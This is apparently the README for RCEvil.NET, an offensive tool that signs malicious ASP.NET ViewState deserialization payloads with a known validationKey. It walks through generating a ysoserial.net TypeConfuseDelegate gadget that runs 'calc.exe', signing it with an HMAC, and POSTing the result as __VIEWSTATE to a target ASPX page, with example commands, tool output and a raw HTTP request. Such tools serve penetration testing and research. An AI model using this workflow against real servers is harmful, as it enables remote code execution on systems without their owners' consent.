RCEvil.NET
===

RCEvil.NET is a tool for signing malicious ViewStates with a known validationKey. Any (even empty) ASPX page is a valid target. See http://illuminopi.com/ for full details on the attack vector.

### Prerequisites

1. Visual Studio Community
   * https://visualstudio.microsoft.com/vs/community/
2. Local installation of ysoserial.net:
   * https://github.com/pwntester/ysoserial.net

### Usage

1. Build your payload in ysoserial.net: 
> ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -o base64 -c "calc.exe"

2. Sign the payload using RCEvil.NET: 
> RCEvil.NET.exe -u [URL] -v [VALIDATION_KEY] -m [DIGEST_TYPE] -p [YSOSERIAL.NET_PAYLOAD]

3. Direct the payload to the target ASPX page

### Examples

Generate base payload in ysoserial.net:
> ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -o base64 -c "calc.exe" /wEyxBEAAQAAAP////8...

Sign ysoserial.net payload with an HMAC using RCEvil.NET:
>>>
 RCEvil.NET.exe -u /Default.aspx -v 000102030405060708090a0b0c0d0e0f10111213 -m SHA1 -p /wEyxBEAAQAAAP////8...

 -=[ ViewState Toolset ]=-

 URL: /Default.aspx  
 Digest Algorithm: SHA1  
 ValidationKey: 000102030405060708090a0b0c0d0e0f10111213  
 Modifier: 34030bca

 -=[ Final Payload ]=-

 %2fwEyxBEAAQAAAP%2f%2f%2f%2f8BAAAAAAAAAAwC...
>>>

Finally, send the HMAC-signed ViewState payload to the target:
>>>
 POST /Default.aspx HTTP/1.1  
 Host: 192.168.112.148  
 Content-Type: application/x-www-form-urlencoded  
 Content-Length: 3072

 __VIEWSTATE=%2fwEyxBEAAQAAAP%2f%2f%2f%2f8BAAAAAAAAAAwC...
>>>
